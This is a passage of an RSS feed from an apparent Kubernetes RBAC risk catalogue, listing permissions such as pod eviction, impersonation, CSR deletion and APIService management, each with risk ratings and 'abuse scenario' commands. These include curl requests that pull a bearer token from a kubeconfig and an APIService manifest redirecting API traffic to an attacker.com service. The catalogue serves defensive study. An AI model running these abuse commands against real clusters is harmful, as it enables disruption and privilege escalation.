&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> https://&amp;lt;kubernetes-api-server&amp;gt;/api/v1/namespaces/&amp;lt;namespace&amp;gt;/pods/&amp;lt;pod-name&amp;gt;/eviction
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: curl -k -H &amp;#34;Authorization: Bearer $(cat ~/.kube/config | grep token: | awk &amp;#39;{print $2}&amp;#39;)&amp;#34; -H &amp;#34;Content-Type: application/json&amp;#34; -X POST --data &amp;#39;{&amp;#34;apiVersion&amp;#34;:&amp;#34;policy/v1&amp;#34;,&amp;#34;kind&amp;#34;:&amp;#34;Eviction&amp;#34;,&amp;#34;metadata&amp;#34;:{&amp;#34;name&amp;#34;:&amp;#34;my-app-pod-xyz&amp;#34;,&amp;#34;namespace&amp;#34;:&amp;#34;default&amp;#34;}}&amp;#39; https://127.0.0.1:6443/api/v1/namespaces/default/pods/my-app-pod-xyz/eviction&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Evict Pods in a namespace</title><link>https://rbac-atlas.github.io/rules/1058/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1058/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1058&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Evict Pods in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Denial of Service&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>policy&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>pods/eviction&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows evicting (deleting) pods within a specific namespace using the eviction API. This can disrupt applications running in that namespace, leading to a localized denial of service.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Evict a specific pod within the namespace by directly calling the eviction API.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace &amp;lt;kubernetes-api-server&amp;gt; with your API server address&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Replace &amp;lt;token&amp;gt; with your authentication token&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -k -H &lt;span class="s2">&amp;#34;Authorization: Bearer &amp;lt;token&amp;gt;&amp;#34;&lt;/span> -H &lt;span class="s2">&amp;#34;Content-Type: application/json&amp;#34;&lt;/span> -X POST &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> --data &lt;span class="s1">&amp;#39;{&amp;#34;apiVersion&amp;#34;:&amp;#34;policy/v1&amp;#34;,&amp;#34;kind&amp;#34;:&amp;#34;Eviction&amp;#34;,&amp;#34;metadata&amp;#34;:{&amp;#34;name&amp;#34;:&amp;#34;&amp;lt;pod-name&amp;gt;&amp;#34;,&amp;#34;namespace&amp;#34;:&amp;#34;&amp;lt;namespace&amp;gt;&amp;#34;}}&amp;#39;&lt;/span> &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> https://&amp;lt;kubernetes-api-server&amp;gt;/api/v1/namespaces/&amp;lt;namespace&amp;gt;/pods/&amp;lt;pod-name&amp;gt;/eviction
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: curl -k -H &amp;#34;Authorization: Bearer $(cat ~/.kube/config | grep token: | awk &amp;#39;{print $2}&amp;#39;)&amp;#34; -H &amp;#34;Content-Type: application/json&amp;#34; --data &amp;#39;{&amp;#34;apiVersion&amp;#34;:&amp;#34;policy/v1&amp;#34;,&amp;#34;kind&amp;#34;:&amp;#34;Eviction&amp;#34;,&amp;#34;metadata&amp;#34;:{&amp;#34;name&amp;#34;:&amp;#34;my-app-pod-xyz&amp;#34;,&amp;#34;namespace&amp;#34;:&amp;#34;production&amp;#34;}}&amp;#39; https://127.0.0.1:6443/api/v1/namespaces/production/pods/my-app-pod-xyz/eviction&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Impersonate users, groups, or service accounts (cluster-wide)</title><link>https://rbac-atlas.github.io/rules/1066/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1066/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1066&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Impersonate users, groups, or service accounts (cluster-wide)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>users, groups, serviceaccounts, userextras, uids&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>impersonate&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusteradminaccess">&lt;a href="https://rbac-atlas.github.io/tags/clusteradminaccess/">ClusterAdminAccess&lt;/a>&lt;/span>
 &lt;span class="tag-impersonation">&lt;a href="https://rbac-atlas.github.io/tags/impersonation/">Impersonation&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-spoofing">&lt;a href="https://rbac-atlas.github.io/tags/spoofing/">Spoofing&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows impersonating any user, group, or service account across the entire cluster via impersonation headers. This can be used to escalate privileges to the level of the impersonated identity, potentially gaining cluster-admin access.&lt;/p></description></item><item><title>List MutatingWebhookConfigurations (Reconnaissance)</title><link>https://rbac-atlas.github.io/rules/1084/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1084/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1084&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>List MutatingWebhookConfigurations (Reconnaissance)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>admissionregistration.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>mutatingwebhookconfigurations&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
 &lt;span class="tag-webhookreconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/webhookreconnaissance/">WebhookReconnaissance&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows listing of MutatingWebhookConfigurations cluster-wide. This reveals information about how resources might be altered upon creation/update, aiding attackers in understanding automated modifications and potential vulnerabilities.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>List all MutatingWebhookConfigurations.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get mutatingwebhookconfigurations
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>List Namespaces (Cluster Reconnaissance)</title><link>https://rbac-atlas.github.io/rules/1082/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1082/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1082&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>List Namespaces (Cluster Reconnaissance)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-low">Low&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>namespaces&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-clusterstructure">&lt;a href="https://rbac-atlas.github.io/tags/clusterstructure/">ClusterStructure&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows listing all namespaces in the cluster. This helps an attacker map out the cluster structure, identify potential targets, and understand workload separation. It&amp;rsquo;s a foundational reconnaissance step.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>List all namespaces in the cluster.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get namespaces
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>List ValidatingWebhookConfigurations (Reconnaissance)</title><link>https://rbac-atlas.github.io/rules/1083/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1083/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1083&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>List ValidatingWebhookConfigurations (Reconnaissance)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>admissionregistration.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>validatingwebhookconfigurations&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-reconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/reconnaissance/">Reconnaissance&lt;/a>&lt;/span>
 &lt;span class="tag-webhookreconnaissance">&lt;a href="https://rbac-atlas.github.io/tags/webhookreconnaissance/">WebhookReconnaissance&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows listing of ValidatingWebhookConfigurations cluster-wide. This reveals information about admission control mechanisms and security policies enforced, aiding attackers in understanding defense postures.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>List all ValidatingWebhookConfigurations.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get validatingwebhookconfigurations
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage (get, list, watch, delete) CertificateSigningRequests</title><link>https://rbac-atlas.github.io/rules/1054/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1054/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1054&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage (get, list, watch, delete) CertificateSigningRequests&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Information Disclosure&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>certificates.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>certificatesigningrequests&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>get, list, watch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits viewing, listing, watching, or deleting CertificateSigningRequests. Viewing CSRs can disclose information about pending certificate requests. Deleting CSRs can cause denial of service by preventing legitimate certificates from being issued or renewed.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>List all CertificateSigningRequests.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl get csr
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Delete a specific CertificateSigningRequest, preventing certificate issuance.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete csr &amp;lt;csr-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete csr my-app-csr&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage APIServices</title><link>https://rbac-atlas.github.io/rules/1046/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1046/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1046&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage APIServices&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>apiregistration.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>apiservices&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-apiservicemanipulation">&lt;a href="https://rbac-atlas.github.io/tags/apiservicemanipulation/">APIServiceManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-informationdisclosure">&lt;a href="https://rbac-atlas.github.io/tags/informationdisclosure/">InformationDisclosure&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants control over APIServices, which register aggregated API servers. This is highly critical as an attacker can redirect API requests to a malicious server, intercept traffic, escalate privileges, cause denial of service, or exfiltrate information.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new APIService to redirect API calls to a malicious server.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: apiregistration.k8s.io/v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: APIService
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: v1alpha1.attacker.com
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> service:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: &amp;lt;malicious-service-name&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> namespace: &amp;lt;malicious-service-namespace&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> group: attacker.com
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> version: v1alpha1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> caBundle: &amp;lt;base64-encoded-ca-cert&amp;gt; # CA for the malicious service
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> groupPriorityMinimum: 2000 # Higher than core APIs
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> versionPriority: 200
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Delete an existing APIService, disrupting aggregated API functionality.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete apiservice &amp;lt;apiservice-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete apiservice v1beta1.metrics.k8s.io&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage ArgoCD Applications (argoproj.io)</title><link>https://rbac-atlas.github.io/rules/1063/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1063/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1063&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage ArgoCD Applications (argoproj.io)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>argoproj.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>applications&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete, sync&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-codeexecution">&lt;a href="https://rbac-atlas.github.io/tags/codeexecution/">CodeExecution&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloaddeployment">&lt;a href="https://rbac-atlas.github.io/tags/workloaddeployment/">WorkloadDeployment&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants permission to manage ArgoCD Application resources. This allows deploying, modifying, or deleting applications managed by ArgoCD, potentially leading to the deployment of malicious workloads, unauthorized code execution, tampering with production systems, and privilege escalation if ArgoCD has high privileges.&lt;/p></description></item><item><title>Manage Cilium ClusterwideNetworkPolicies (cilium.io)</title><link>https://rbac-atlas.github.io/rules/1064/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1064/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1064&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Cilium ClusterwideNetworkPolicies (cilium.io)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>NetworkManipulation&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>cilium.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>ciliumclusterwidenetworkpolicies&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-networkmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/networkmanipulation/">NetworkManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-networkpolicymanagement">&lt;a href="https://rbac-atlas.github.io/tags/networkpolicymanagement/">NetworkPolicyManagement&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
